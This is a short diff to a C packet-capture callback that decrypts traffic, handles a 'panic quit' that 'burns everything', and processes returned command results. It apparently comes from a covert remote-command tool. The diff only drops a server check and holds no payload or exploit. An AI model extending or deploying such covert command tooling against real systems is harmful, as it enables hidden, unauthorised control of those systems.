@@ -191,7 +191,7 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 		fprintf(stderr, "Panic quit command, burning everything!!\n");
 		exit_panic();
 	}
-	else if ((start = strstr(decrypted, RESULT_START)) && !server) {
+	else if ((start = strstr(decrypted, RESULT_START))) {
 		/* process command results */
 		start += strlen(RESULT_START);
 
